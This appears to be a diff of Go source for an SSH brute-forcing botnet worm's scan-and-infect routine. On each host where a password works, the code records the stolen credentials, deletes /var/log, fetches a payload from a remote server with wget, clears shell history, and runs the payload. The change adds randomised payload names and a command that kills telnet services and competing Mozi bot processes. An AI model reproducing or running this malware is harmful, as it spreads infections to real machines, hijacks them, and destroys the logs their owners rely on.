@@ -295,10 +295,11 @@ func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
 						b.session = sshConn
 						b.password = paswdList[paswd]
 						if err == nil {
-							b.payload = genName('a')
+							b.payload = genName('a') + genRange(10000, 1000)
 							b.Report("🏳 " + nCores + "Installing bot: " + rtnIP)
 							b.sshExecute("touch /tmp/.ffff; printf \""+b.password+"\\n"+rtnIP+"\\n\""+" > /tmp/.ffff", false)
 							b.sshExecute("rm -rf /var/log/; wget -O ."+b.payload+" "+b.pServer+"; history -c; rm ~/.bash_history", true)
+							b.sshExecute("fuser -k -n tcp 23; killall utelnetd telnetd i .i mozi.m Mozi.m mozi.a Mozi.a", true)
 							b.sshExecute("chmod 700 ."+b.payload, true)
 							go b.sshExecute("./."+b.payload+" &", true)
 							isRun = true
